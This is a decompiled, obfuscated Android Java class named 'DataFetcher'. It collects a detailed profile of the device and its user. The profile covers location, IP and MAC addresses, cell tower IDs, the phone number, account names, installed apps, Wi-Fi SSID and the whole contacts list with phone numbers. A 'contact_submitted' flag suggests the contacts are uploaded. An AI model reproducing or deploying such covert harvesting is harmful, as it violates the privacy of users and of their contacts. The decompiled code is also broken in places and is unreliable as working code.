package com.mavl.dc;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.Log;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import org.apache.http.conn.util.InetAddressUtils;

public final class c
{
  Context a;
  String b = null;
  Location c = null;
  j d = new d(this);
  private TelephonyManager e;
  
  public c(Context paramContext)
  {
    this.a = paramContext.getApplicationContext();
    this.e = ((TelephonyManager)this.a.getSystemService("phone"));
    a();
  }
  
  private String a(String paramString)
  {
    try
    {
      paramString = this.a.getPackageManager().getApplicationInfo(this.a.getPackageName(), 128).metaData.getString(paramString);
      return paramString;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
    return null;
  }
  
  private static String c()
  {
    try
    {
      InetAddress localInetAddress;
      do
      {
        localObject = NetworkInterface.getNetworkInterfaces();
        Enumeration localEnumeration;
        while (!localEnumeration.hasMoreElements())
        {
          if (!((Enumeration)localObject).hasMoreElements()) {
            break;
          }
          localEnumeration = ((NetworkInterface)((Enumeration)localObject).nextElement()).getInetAddresses();
        }
        localInetAddress = (InetAddress)localEnumeration.nextElement();
      } while ((localInetAddress.isLoopbackAddress()) || (!InetAddressUtils.isIPv4Address(localInetAddress.getHostAddress())));
      Object localObject = localInetAddress.getHostAddress();
      return localObject;
    }
    catch (Exception localException)
    {
      Log.e("DataFetcher", localException.toString());
    }
    return null;
  }
  
  private static String d()
  {
    try
    {
      Object localObject;
      do
      {
        do
        {
          localEnumeration1 = NetworkInterface.getNetworkInterfaces();
          Enumeration localEnumeration2;
          while (!localEnumeration2.hasMoreElements())
          {
            if (!localEnumeration1.hasMoreElements()) {
              break;
            }
            localEnumeration2 = ((NetworkInterface)localEnumeration1.nextElement()).getInetAddresses();
          }
          localObject = (InetAddress)localEnumeration2.nextElement();
        } while ((((InetAddress)localObject).isLoopbackAddress()) || (InetAddressUtils.isIPv4Address(((InetAddress)localObject).getHostAddress())));
        localObject = ((InetAddress)localObject).getHostAddress().split("%");
      } while ((localObject == null) || (!InetAddressUtils.isIPv6Address(localObject[0])));
      Enumeration localEnumeration1 = localObject[0];
      return localEnumeration1;
    }
    catch (Exception localException)
    {
      Log.e("DataFetcher", localException.toString());
    }
    return null;
  }
  
  private String e()
  {
    if (this.b == null) {
      AsyncTask.execute(new e(this));
    }
    return this.b;
  }
  
  private int f()
  {
    try
    {
      GsmCellLocation localGsmCellLocation = (GsmCellLocation)this.e.getCellLocation();
      if (localGsmCellLocation != null)
      {
        int i = localGsmCellLocation.getCid();
        return i;
      }
    }
    catch (Exception localException) {}
    return 0;
  }
  
  private int g()
  {
    try
    {
      GsmCellLocation localGsmCellLocation = (GsmCellLocation)this.e.getCellLocation();
      if (localGsmCellLocation != null)
      {
        int i = localGsmCellLocation.getLac();
        return i;
      }
    }
    catch (Exception localException) {}
    return 0;
  }
  
  private String h()
  {
    try
    {
      String str = this.e.getSimOperator();
      boolean bool = TextUtils.isEmpty(str);
      if (bool) {
        return null;
      }
      return str;
    }
    catch (Exception localException) {}
    return null;
  }
  
  private int i()
  {
    try
    {
      NetworkInfo.State localState = ((ConnectivityManager)this.a.getSystemService("connectivity")).getNetworkInfo(1).getState();
      if ((localState == NetworkInfo.State.CONNECTED) || (localState == NetworkInfo.State.CONNECTING)) {
        break label174;
      }
      int i = this.e.getNetworkType();
      switch (i)
      {
      }
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    return 0;
    return 9;
    return 6;
    return 4;
    return 16;
    return 7;
    return 8;
    return 14;
    return 3;
    return 10;
    return 12;
    return 17;
    return 11;
    return 13;
    return 15;
    return 5;
    return 0;
    label174:
    return 1;
  }
  
  private String j()
  {
    for (;;)
    {
      try
      {
        Object localObject1 = AccountManager.get(this.a).getAccountsByType("com.google");
        if (localObject1.length > 0)
        {
          localObject1 = localObject1[0];
          if (localObject1 == null) {
            break;
          }
          if (TextUtils.isEmpty(((Account)localObject1).name)) {
            return null;
          }
          localObject1 = ((Account)localObject1).name;
          return localObject1;
        }
      }
      catch (Exception localException)
      {
        return null;
      }
      Object localObject2 = null;
    }
    return null;
  }
  
  private String k()
  {
    for (;;)
    {
      int i;
      try
      {
        Object localObject1 = AccountManager.get(this.a).getAccounts();
        StringBuilder localStringBuilder = new StringBuilder();
        if (localObject1.length > 0)
        {
          i = 0;
          if (i < localObject1.length)
          {
            Object localObject2 = localObject1[i];
            if ((localObject2 == null) || (TextUtils.isEmpty(localObject2.name))) {
              break label119;
            }
            localStringBuilder.append(localObject2.name);
            localStringBuilder.append("|");
            break label119;
          }
        }
        if (localStringBuilder.length() > 0) {
          localStringBuilder.deleteCharAt(localStringBuilder.length() - 1);
        }
        localObject1 = localStringBuilder.toString();
        boolean bool = TextUtils.isEmpty((CharSequence)localObject1);
        if (bool) {
          return null;
        }
        return localObject1;
      }
      catch (Exception localException)
      {
        return null;
      }
      label119:
      i += 1;
    }
  }
  
  private String l()
  {
    try
    {
      String str = this.e.getLine1Number();
      boolean bool = TextUtils.isEmpty(str);
      if (bool) {
        return null;
      }
      return str;
    }
    catch (Exception localException) {}
    return null;
  }
  
  private String m()
  {
    for (;;)
    {
      int i;
      try
      {
        Object localObject = new StringBuilder();
        List localList = this.a.getPackageManager().getInstalledPackages(0);
        i = 0;
        if (i < localList.size())
        {
          PackageInfo localPackageInfo = (PackageInfo)localList.get(i);
          if ((localPackageInfo.applicationInfo.flags & 0x1) == 0)
          {
            ((StringBuilder)localObject).append(localPackageInfo.packageName);
            ((StringBuilder)localObject).append("|");
          }
        }
        else
        {
          if (((StringBuilder)localObject).length() > 0) {
            ((StringBuilder)localObject).deleteCharAt(((StringBuilder)localObject).length() - 1);
          }
          localObject = ((StringBuilder)localObject).toString();
          boolean bool = TextUtils.isEmpty((CharSequence)localObject);
          if (bool) {
            localObject = null;
          }
          return localObject;
        }
      }
      catch (Exception localException)
      {
        return null;
      }
      i += 1;
    }
  }
  
  private String n()
  {
    try
    {
      String str = ((WifiManager)this.a.getSystemService("wifi")).getConnectionInfo().getSSID();
      return str;
    }
    catch (Exception localException) {}
    return null;
  }
  
  private String o()
  {
    try
    {
      String str = ((WifiManager)this.a.getSystemService("wifi")).getConnectionInfo().getMacAddress();
      return str;
    }
    catch (Exception localException) {}
    return null;
  }
  
  private String p()
  {
    try
    {
      String str = this.a.getPackageManager().getPackageInfo(this.a.getPackageName(), 0).versionName;
      return str;
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException) {}
    return null;
  }
  
  private String q()
  {
    try
    {
      Object localObject1 = new StringBuilder();
      ContentResolver localContentResolver = this.a.getContentResolver();
      Cursor localCursor = localContentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
      if (localCursor == null) {
        return ((StringBuilder)localObject1).toString();
      }
      if (localCursor.getCount() > 0) {
        while (localCursor.moveToNext())
        {
          Object localObject2 = localCursor.getString(localCursor.getColumnIndex("_id"));
          String str1 = localCursor.getString(localCursor.getColumnIndex("display_name"));
          if (Integer.parseInt(localCursor.getString(localCursor.getColumnIndex("has_phone_number"))) > 0)
          {
            localObject2 = localContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[] { localObject2 }, null);
            if (localObject2 != null)
            {
              while (((Cursor)localObject2).moveToNext())
              {
                String str2 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("data1"));
                ((StringBuilder)localObject1).append(str1);
                ((StringBuilder)localObject1).append(":");
                ((StringBuilder)localObject1).append(str2);
                ((StringBuilder)localObject1).append("|");
              }
              ((Cursor)localObject2).close();
            }
          }
        }
      }
      localCursor.close();
      if (((StringBuilder)localObject1).length() > 0) {
        ((StringBuilder)localObject1).deleteCharAt(((StringBuilder)localObject1).length() - 1);
      }
      localObject1 = ((StringBuilder)localObject1).toString();
      boolean bool = TextUtils.isEmpty((CharSequence)localObject1);
      if (bool) {
        localObject1 = null;
      }
      return localObject1;
    }
    catch (Exception localException) {}
    return null;
  }
  
  private String r()
  {
    try
    {
      String str = ((TelephonyManager)this.a.getSystemService("phone")).getNetworkOperator();
      if (!TextUtils.isEmpty(str))
      {
        str = str.substring(3);
        return str;
      }
    }
    catch (Exception localException) {}
    return null;
  }
  
  private String s()
  {
    try
    {
      String str = ((TelephonyManager)this.a.getSystemService("phone")).getNetworkOperator();
      if (!TextUtils.isEmpty(str))
      {
        str = str.substring(0, 3);
        return str;
      }
    }
    catch (Exception localException) {}
    return null;
  }
  
  public final void a()
  {
    try
    {
      new f().a(this.a, this.d);
      e();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public final k b()
  {
    k localK = new k();
    if (this.c != null)
    {
      float f = this.c.getAccuracy();
      double d1 = this.c.getLatitude();
      double d2 = this.c.getLongitude();
      l = this.c.getTime();
      localK.a(l.t, Float.valueOf(f));
      localK.a(l.s, Double.valueOf(d1));
      localK.a(l.r, Double.valueOf(d2));
      localK.a(l.u, Long.valueOf(l));
    }
    String str = this.a.getPackageName();
    localK.a(l.d, str);
    str = System.getProperty("http.agent");
    localK.a(l.e, str);
    str = c();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.f, str);
    }
    str = d();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.g, str);
    }
    str = e();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.h, str);
    }
    long l = System.currentTimeMillis();
    localK.a(l.k, Long.valueOf(l));
    localK.a(l.l, Integer.valueOf(0));
    int i = f();
    localK.a(l.v, Integer.valueOf(i));
    i = g();
    localK.a(l.w, Integer.valueOf(i));
    str = Build.MANUFACTURER;
    localK.a(l.x, str);
    str = Build.MODEL;
    localK.a(l.y, str);
    str = Build.VERSION.RELEASE;
    localK.a(l.z, str);
    i = Build.VERSION.SDK_INT;
    localK.a(l.B, Integer.valueOf(i));
    str = Locale.getDefault().getLanguage();
    localK.a(l.C, str);
    str = h();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.D, str);
    }
    i = i();
    localK.a(l.E, Integer.valueOf(i));
    str = j();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.L, str);
    }
    str = k();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.M, str);
    }
    str = l();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.N, str);
    }
    str = r();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.W, str);
    }
    str = s();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.X, str);
    }
    str = m();
    localK.a(l.O, str);
    str = n();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.R, str);
    }
    str = o();
    if (!TextUtils.isEmpty(str)) {
      localK.a(l.U, str);
    }
    str = a("UMENG_CHANNEL");
    localK.a(l.T, str);
    str = p();
    localK.a(l.S, str);
    if (PreferenceManager.getDefaultSharedPreferences(this.a).getInt("DataFetcher_prefs_contact_submitted", 0) == 0)
    {
      str = q();
      localK.a(l.V, str);
    }
    return localK;
  }
}
